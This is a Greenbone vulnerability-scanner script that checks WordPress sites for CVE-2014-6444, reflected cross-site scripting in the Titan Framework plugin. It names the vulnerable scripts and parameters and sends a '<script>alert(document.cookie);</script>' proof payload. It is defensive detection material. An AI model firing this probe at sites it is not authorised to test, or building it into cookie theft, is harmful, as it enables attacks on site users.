CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.807057" );
	script_version( "2021-09-20T11:01:47+0000" );
	script_cve_id( "CVE-2014-6444" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2021-09-20 11:01:47 +0000 (Mon, 20 Sep 2021)" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2016-01-12 01:21:00 +0000 (Tue, 12 Jan 2016)" );
	script_tag( name: "creation_date", value: "2016-02-05 09:30:21 +0530 (Fri, 05 Feb 2016)" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_name( "WordPress Titan Framework Multiple Cross Site Scripting Vulnerabilities" );
	script_tag( name: "summary", value: "This host is installed with WordPress
  Titan Framework plugin and is prone to multiple cross site scripting
  vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request
  and check whether it is able to read cookie or not." );
	script_tag( name: "insight", value: "Multiple flaws are due to:

  - An insufficient validation of user supplied input via 't' parameter to
    'iframe-googlefont-preview.php' script.

  - An insufficient validation of user supplied input via 'text' parameter
    to 'iframe-font-preview.php' script." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to execute arbitrary HTML and script code in a user's browser session
  in the context of an affected site." );
	script_tag( name: "affected", value: "WordPress Titan Framework plugin version
  before 1.6" );
	script_tag( name: "solution", value: "Update to version 1.6 or higher." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "https://wpvulndb.com/vulnerabilities/8233" );
	script_xref( name: "URL", value: "https://research.g0blin.co.uk/cve-2014-6444" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	script_xref( name: "URL", value: "https://wordpress.org/plugins/titan-framework" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
url = dir + "/wp-content/plugins/titan-framework/iframe-font-preview.php?text=<script>alert(document.cookie);</script>";
if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "<script>alert\\(document.cookie\\);</script>", extra_check: make_list( "titan-framework",
	 "wordpress" ) )){
	report = http_report_vuln_url( port: http_port, url: url );
	security_message( port: http_port, data: report );
	exit( 0 );
}

